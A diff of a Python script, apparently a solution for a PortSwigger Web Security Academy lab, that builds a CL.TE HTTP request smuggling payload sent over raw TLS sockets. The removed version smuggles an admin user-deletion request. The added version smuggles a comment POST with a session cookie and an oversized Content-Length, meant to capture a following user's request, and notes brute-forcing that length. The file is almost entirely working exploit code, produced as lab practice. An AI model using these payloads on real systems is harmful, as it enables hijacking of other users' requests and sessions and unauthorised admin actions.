@@ -1,40 +1,39 @@
 import socket
 import ssl
+import re
 
-host = '0ac7004a040e0ca682bafb6600ec00eb.web-security-academy.net'
+host = '0ac8001903c65ba48175616600af007b.web-security-academy.net'
 port = 443
 
 # Smuggling payload (CL.TE)
 payload = (
     "POST / HTTP/1.1\r\n"
-    f"Host: {host}\r\n"
+    "Host: 0a18003a0499b40c80640dda00fa00c8.web-security-academy.net\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 140\r\n"
+    "Content-Length: 275\r\n"
     "Transfer-Encoding: chunked\r\n"
     "\r\n"
     "0\r\n"
     "\r\n"
-    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
-    "Host: localhost\r\n"
+    "POST /post/comment HTTP/1.1\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 4\r\n"
+    "Content-Length: 960\r\n"
+    "Cookie: session=3xvf74S0IRQP2ZrXlQ8umrMdAGwbNvK6\r\n"
     "\r\n"
-    "x=\r\n"
+    "csrf=6B0xrQ8hTNLOZk4YMlG70rPd2LLsjMKf&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=Comment+3"
 )
 
 # body = (
-#     "0\r\n"
-#     "\r\n"
-#     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
-#     "Host: localhost\r\n"
+#     "POST /post/comment HTTP/1.1\r\n"
 #     "Content-Type: application/x-www-form-urlencoded\r\n"
-#     "Content-Length: 4\r\n"
+#     "Content-Length: 900\r\n"
+#     "Cookie: session=3xvf74S0IRQP2ZrXlQ8umrMdAGwbNvK6\r\n"
 #     "\r\n"
-#     "x=\r\n"
+#     "csrf=6B0xrQ8hTNLOZk4YMlG70rPd2LLsjMKf&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=Comment+2"
 # )
-# print(len(body)) #140
+# print(len(body)) #275
 
-# print(len("x=\r\n"))  #4
+# Brute Content-Length: X (Line 20) -> 960
 
 def send_raw_https(host, port, raw_payload):
     context = ssl.create_default_context()
